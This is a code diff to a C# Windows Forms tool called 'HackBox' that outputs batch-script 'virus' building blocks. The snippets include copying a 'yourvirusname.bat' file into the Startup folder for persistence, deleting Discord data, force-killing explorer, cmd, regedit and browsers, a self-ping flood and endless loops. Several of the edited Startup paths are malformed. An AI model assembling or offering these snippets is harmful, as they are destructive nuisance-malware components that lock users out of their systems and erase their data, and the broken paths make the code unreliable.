@@ -27,7 +27,7 @@ namespace HackBox
 		private void button1_Click(object sender, EventArgs e)
 		{
 			string selfdos = "ping -t -l 3000 127.0.0.1";
-			listBox1.Items.Add(selfdos);
+			richTextBox1.AppendText(selfdos + "\n");
 
 		}
 
@@ -39,18 +39,18 @@ namespace HackBox
 
 		private void button2_Click(object sender, EventArgs e)
 		{
-			string start = @"copy %USERPROFILE%\Desktop\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup ";
-			string start2 = @"copy %USERPROFILE%\Downloads\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
-			string start3 = @"copy %USERPROFILE%\Documents\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
-			string start4 = @"copy %USERPROFILE%\Pictures\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
-			string start5 = @"copy %USERPROFILE%\Videos\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
-			string start6 = @"copy %USERPROFILE%\Music\yourvirusname.bat %USERPROFILE\Start Menu\Programs\Startup";
-			listBox1.Items.Add(start);
-			listBox1.Items.Add(start2);
-			listBox1.Items.Add(start3);
-			listBox1.Items.Add(start4);
-			listBox1.Items.Add(start5);
-			listBox1.Items.Add(start6);
+			string start = @"copy %USERPROFILE%\Desktop\yourvirusname.bat %USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup ";
+			string start2 = @"copy %USERPROFILE%\Downloads\yourvirusname.bat %USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup";
+			string start3 = @"copy %USERPROFILE%\Documents\yourvirusname.bat %USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup";
+			string start4 = @"copy %USERPROFILE%\Pictures\yourvirusname.bat %USERPROFILE\AppData\Microsoft\WindowsStart Menu\Programs\Startup";
+			string start5 = @"copy %USERPROFILE%\Videos\yourvirusname.bat %USERPROFILE\AppData\Microsoft\WindowsStart Menu\Programs\Startup";
+			string start6 = @"copy %USERPROFILE%\Music\yourvirusname.bat %USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup";
+			richTextBox1.AppendText(start + "\n");
+			richTextBox1.AppendText(start2 + "\n");
+			richTextBox1.AppendText(start3 + "\n");
+			richTextBox1.AppendText(start4 + "\n");
+			richTextBox1.AppendText(start5 + "\n");
+			richTextBox1.AppendText(start6 + "\n");
 
 		}
 
@@ -59,9 +59,9 @@ namespace HackBox
 			string mine = " :mine";
 			string mine2 = "echo %random%%random%";
 			string mine3 = "goto mine";
-			listBox1.Items.Add(mine);
-			listBox1.Items.Add(mine2);
-			listBox1.Items.Add(mine3);
+			richTextBox1.AppendText(mine + "\n");
+			richTextBox1.AppendText(mine2 + "\n");
+			richTextBox1.AppendText(mine3 + "\n" + "::plusminus on top");
 
 		}
 
@@ -69,8 +69,8 @@ namespace HackBox
 		{
 			string del = @"del /q /f %appdata%\Discord";
 			string del2 = @"del /q /f %localappdata%\discord";
-			listBox1.Items.Add(del);
-			listBox1.Items.Add(del2);
+			richTextBox1.AppendText(del + "\n");
+			richTextBox1.AppendText(del2 + "\n");
 		}
 
 		private void button5_Click(object sender, EventArgs e)
@@ -84,6 +84,35 @@ namespace HackBox
 			Form2 penis = new Form2();
 			penis.ShowDialog();
 			this.Close();
+		}
+
+		private void button6_Click(object sender, EventArgs e)
+		{
+			string expl = "taskkill /f /im explorer.exe";
+			string discord = "taskkill /f /im Discord.exe";
+			string reg = "taskkill /f /im regedit.exe";
+			string skype = "taskkill /f /im skype.exe";
+			string cmd = "taskkill /f /im cmd.exe";
+			string chrome = "taskkill /f /im chrome.exe";
+
+			richTextBox1.AppendText(cmd + "\n");
+			richTextBox1.AppendText(expl + "\n");
+			richTextBox1.AppendText(discord + "\n");
+			richTextBox1.AppendText(reg + "\n");
+			richTextBox1.AppendText(skype + "\n");
+			richTextBox1.AppendText(chrome + "\n");
+
+		}
+
+		private void button7_Click(object sender, EventArgs e)
+		{
+			string integer = ":roast ";
+			string loop = "start https://www.youtube.com/watch?v=RfAQbrw1Eog";
+			string goint = "goto roast";
+			richTextBox1.AppendText(integer + "\n");
+			richTextBox1.AppendText(loop + "\n");
+			richTextBox1.AppendText(goint + "\n");
+
 		}
 	}
 }
